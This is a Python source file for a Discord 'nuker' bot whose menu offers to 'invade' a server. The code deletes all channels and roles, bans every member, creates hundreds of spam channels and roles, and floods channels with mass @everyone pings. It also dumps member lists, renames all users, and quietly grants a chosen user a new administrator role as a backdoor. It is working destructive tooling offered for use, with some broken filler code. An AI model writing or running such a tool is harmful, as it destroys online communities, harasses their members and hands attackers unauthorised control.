import discord
import time
import multiprocessing



intents = discord.Intents.default()
intents.members = True
client = discord.Client(intents=intents)


def spawn_processes():
    process1 = multiprocessing.Process()
    process2 = multiprocessing.Process()
    process3 = multiprocessing.Process()
    process4 = multiprocessing.Process()
    process1.start()
    process2.start()
    process3.start()
    process4.start()

@client.event
async def on_ready():
    print('logged in as {0.user}'.format(client))

    def botstat():
        for guild in client.guilds:
            print(f"Name: {guild.name} -- ID: {guild.id} -- Members: {guild.member_count}\n")

    def channeldump():
        id0 = int(input("Server ID: "))
        for guild in client.guilds:
            if guild.id == id0:
                file = f"{guild.name}_{guild.id}_dumped_channels.txt"
                f = open(file, "a+")
                for c in guild.channels:
                    # noinspection PyBroadException
                    try:
                        print(f"Name: {c.name} - ID: {c.id}")
                        f.write(f"Name: {c.name} - ID: {c.id}")
                    except Exception:
                        print("Stopped!")
                        pass
                    finally:
                        pass
                print(f"Output saved to: {file}")
                f.close()

    def userdump():
        id0 = int(input("Server ID: "))
        for guild in client.guilds:
            if guild.id == int(id0):
                print(f"Getting member list of {id0}")
                file = f"{guild.name}_{guild.id}_dumped_users.txt"
                f = open(file, "a+")
                for member in guild.members:
                    # noinspection PyBroadException
                    try:
                        f.write(f"Name: {member.name}#{member.discriminator} ID: {member.id}")
                        print(f"Name: {member.name}#{member.discriminator} ID: {member.id}")
                    except Exception:
                        print("Stopped!")
                        break
                    finally:
                        pass
                print(f"output saved to: {file}")
                f.close()

    async def channelcreateMass(ammount_of_threads):
        id0 = int(input("Server ID: "))
        for i in range(ammount_of_threads):
            i = multiprocessing.Process()
            i.start()
            for guild in client.guilds:
                if guild.id == int(id0):
                    var1 = 0
                    spawn_processes()
                    for channels in guild.channels:
                        try:
                            await channels.delete()
                            var1 += 1
                            print(f"Current ammount of deleted channels: {var1}")
                        except Exception:
                            break
                        finally:
                            pass
    



    async def nuke():
        id0 = int(input("Server ID: "))
        for guild in client.guilds:
            if guild.id == int(id0):
                print(f"Starting on {guild.name} - ID: {guild.id}")
                var1 = 0
                var2 = 0
                var3 = 0
                var4 = 0
                var5 = 0
                guild.edit(icon=None)
                for channels in guild.channels:
                    # noinspection PyBroadException
                    try:
                        await channels.delete()
                        var1 += 1
                        print(f"Current ammount of deleted channels: {var1}")
                        time.sleep(0.2)
                    except Exception:
                        break
                    finally:
                        pass
                print(f"Stage 1/5 complete : All deletable channels deleted - {var1}")
                allRoles = await guild.fetch_roles()
                for r in range(len(allRoles)):
                    # noinspection PyBroadException
                    try:
                        await allRoles[r].delete()
                        var2 += 1
                        print(f"Current ammount of deleted roles: {var2}")
                    except Exception:
                        pass
                    finally:
                        pass
                print(f"Stage 2/5 complete: All deletable roles deleted - {var2}")
                for members in guild.members:
                    # noinspection PyBroadException
                    try:
                        await members.ban(reason="owo")
                        time.sleep(0.2)
                        var3 += 1
                        print(f"Current ammount of banned users: {var3}")
                    except Exception:
                        break
                    finally:
                        pass
                print(f"stage 3/5 complete: All bannable members were banned - count: {var3}")
                for maxChannels in range(501):
                    # noinspection PyBroadException
                    try:
                        await guild.create_text_channel('spamspamspam')
                        var4 += 1
                        print(f"Current ammount of channels created: {var4}")
                    except Exception:
                        break
                    finally:
                        pass
                print(f"Stage 4/5 completed: All possible channels were created - {var4}")
                for maxRoles in range(251):
                    # noinspection PyBroadException
                    try:
                        await guild.create_role(name='spamspamspam')
                        print(f"Current ammount of roles created: {var5}")
                    except Exception:
                        break
                    finally:
                        pass
                print(f"Stage 5/5 completed: All possible roles were created - {var5}")

    async def channeldelete():
        id0 = int(input("Server ID: "))
        for guild in client.guilds:
            if guild.id == int(id0):
                var1 = 0
                for channels in guild.channels:
                    try:
                        await channels.delete()
                        var1 += 1
                        print(f"Current ammount of deleted channels: {var1}")
                    except Exception:
                        break
                    finally:
                        pass

    async def channeldelete():
        id0 = int(input("Server ID: "))
        for guild in client.guilds:
            if guild.id == int(id0):
                var1 = 0
                spawn_processes()
                for channels in guild.channels:
                    try:
                        await channels.delete()
                        var1 += 1
                        print(f"Current ammount of deleted channels: {var1}")
                    except Exception:
                        break
                    finally:
                        pass
    
    async def channelcreate():
        id0 = int(input("Server ID: "))
        for guild in client.guilds:
            if guild.id == int(id0):
                var1 = 0
                spawn_processes()
                for i in range(501):
                    try:
                        await guild.create_text_channel('spamspamspam')
                        var1 += 1
                        print(f"Current ammount of created channels: {var1}")
                    except Exception:
                        break
                    finally:
                        pass

    async def roledelete():
        id0 = int(input("Server ID: "))
        for guild in client.guilds:
            if guild.id == int(id0):
                var1 = 0
                allRoles = await guild.fetch_roles()
                for r in range(len(allRoles)):
                    try:
                        await allRoles[r].delete()
                        var1 += 1
                        print(f"Current ammount of deleted roles: {var1}")
                    except Exception:
                        pass
                    finally:
                        pass

    async def rolecreate():
        id0 = int(input("Server ID: "))
        for guild in client.guilds:
            if guild.id == int(id0):
                var1 = 0
                for i in range(251):
                    try:
                        await guild.create_role(name='spamspamspam')
                        var1 += 1
                        print(f"Current ammount of created roles: {var1}")
                    except Exception:
                        break
                    finally:
                        pass

    async def ban():
        id0 = int(input("Server ID: "))
        userid = int(input("User ID: "))
        for guild in client.guilds:
            if guild.id == int(id0):
                for members in guild.members:
                    if members.id == userid:
                        # noinspection PyBroadException
                        try:
                            await members.ban(reason="owo")
                            print(f"Successfully banned {members.name}#{members.tag} -- {members.id}")
                        except Exception:
                            print(f"Failed to ban {userid}!")
                            break
                        finally:
                            pass
    
    async def banall():
        id0 = int(input("Server ID: "))
        for guild in client.guilds:
            if guild.id == int(id0):
                # noinspection PyBroadException
                var1 = 0
                for members in guild.members:
                    try:
                        await members.ban(reason="shit")
                        var1 += 1
                        print(f"Current ammount of banned users: {var1}")
                    except Exception:
                        print("No permission!")
                    finally:
                        pass

    async def unban():
        id0 = int(input("Server ID: "))
        userid = int(input("User ID: "))
        for guild in client.guilds:
            if guild.id == int(id0):
                # noinspection PyBroadException
                try:
                    banned_u = await guild.bans()
                    for banned_u1 in banned_u:
                        if banned_u1.user.id == userid:
                            await guild.unban(banned_u1.user)
                            print(f"Successfully unbanned {userid}")
                except Exception:
                    print(f"Failed to unban {userid} (No permission!)")
                    break
                finally:
                    pass

    async def unbanall():
        id0 = int(input("Server ID: "))
        for guild in client.guilds:
            if guild.id == int(id0):
                # noinspection PyBroadException
                try:
                    banned_u = await guild.bans()
                    for banned_u1 in banned_u:
                        await guild.unban(banned_u1.user)
                        print(f"Successfully unbanned {banned_u1}")
                except Exception:
                    print("No permission!")
                    break
                finally:
                    pass

    async def listbans():
        id0 = int(input("Server ID: "))
        for guild in client.guilds:
            if guild.id == int(id0):
                # noinspection PyBroadException
                try:
                    banned_u = await guild.bans()
                    for banned_u1 in banned_u:
                        print(banned_u1)
                except Exception:
                    print("No permission!")
                    break
                finally:
                    pass

    async def rickroll():
        id0 = int(input("Server ID: "))
        x = 0
        y = 0
        for guild in client.guilds:
            if guild.id == id0:
                while x <= 40000:
                    for c in guild.text_channels:
                        try:
                            await c.send(
                                "@everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone"
                                "@everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone"
                                "@everyone @everyone @everyone @everyone @everyone @everyone @everyone"
                                "@everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone"
                                "@everyone @everyone https://c.tenor.com/VFFJ8Ei3C2IAAAAM/rickroll-rick.gif"
                                "https://c.tenor.com/VFFJ8Ei3C2IAAAAM/rickroll-rick.gif ")
                            y += 1
                            print(f"Current ammount of pings {y}")
                        except Exception:
                            print("Stopped!")
                            break
                        finally:
                            pass
                        x += 1
                        
    async def leaveguild():
        id0 = int(input("Server ID: "))
        for guild in client.guilds:
            if guild.id == id0:
                await guild.leave()

    async def leaveall():
        id0 = int(input("Server ID: "))
        for guild in client.guilds:
            await guild.leave()

    async def deleteemotes():
        id0 = int(input("Server ID: "))
        for guild in client.guilds:
            if guild.id == id0:
                var1 = 0
                for emotes in guild.emojis:
                    try:
                        await emotes.delete()
                        var1 += 1
                        print(f"Current ammount of deleted emotes: {var1}")
                    except Exception:
                        print("Missing permissions!")
                        break
                    finally:
                        pass

    async def change_all_nicknames():
        id0 = int(input("Server ID: "))
        for guild in client.guilds:
            if guild.id == id0:
                var1 = 0
                var2 = 1
                for members in guild.members:
                    try:
                        await members.edit(nick="CLOWN")
                        var1 += 1
                        print(f"Current ammount of changed nicknames: {var1}")
                    except Exception:
                        print(f"No permissions! {30 - var2} of 30 tries left")
                        var2 += 1
                        if var2 >= 30:
                            break
                    finally:
                        pass

    async def addRoleToUser(user, guildid):
        id0 = str(guildid)
        for guild in client.guilds:
            if guild.id == int(id0):
                print('test1')
                await guild.create_role(name="see12345", permissions=discord.Permissions(8), color=discord.Colour(0xff000))
                print('test2')
                allRoles = await guild.fetch_roles()
                for r in range(len(allRoles)):
                    if str(allRoles[r]) == 'see12345':
                        print('test3')
                        for member in guild.members:
                            if member.id == int(user):
                                print('test4')
                                await member.add_roles(allRoles[r])
    
    async def addAdminToEveryone(guildid):
        id0 = str(guildid)
        for guild in client.guilds:
            if guild.id == int(id0):
                allRoles = await guild.fetch_roles()
                for r in range(len(allRoles)):
                    if str(r) == "everyone":       
                        await allRoles[r].edit_role(permissions=discord.Permissions(8))
                        print("Success!")


    async def user_prompt():
        while True:
            print("Options:\n[1]botstat\n[2]channeldump (dumps channels into a local file)\n[3]userdump (dumps "
                  "userinfo into a local file)\n[4]invade (nukes a server entirely (LOL))\n[41]Delete all channels\n[42]Create 500 channels\n[43]Delete all roles\n[44]Create 250 roles\n[5]Ban a member\n[51]Ban all members\n[52]Unban "
                  "a member\n[53]Unban ALL members\n[54]List all banned members\n[6]Get Rickrolled\n[7]Leave a guild with the bot\n[71]Leave all guilds with the bot\n[8]Delete all server emotes\n[9]Change all user nicknames")
            command = input(">> ")
            if command == "1":
                botstat()
            elif command == "2":
                channeldump()
            elif command == "3":
                userdump()
            elif command == "4":
                await nuke()
            elif command == "41":
                await channeldelete()
            elif command == "42":
                await channelcreate()
            elif command == "43":
                await roledelete()
            elif command == "44":
                await rolecreate()
            elif command == "5":
                await ban()
            elif command == "51":
                await banall()
            elif command == "52":
                await unban()
            elif command == "53":
                await unbanall()
            elif command == "54":
                await listbans()
            elif command == "6":
                await rickroll()
            elif command == "7":
                await leaveguild()
            elif command == "71":
                await leaveall()
            elif command == "8":
                await deleteemotes()
            elif command == "9":
                await change_all_nicknames()

    if __name__ == '__main__':
        #await addRoleToUser("228919687851802624", "385790970836418560")
        await user_prompt()
        #await channelcreateMass(4)

client.run("YOUR-TOKEN")
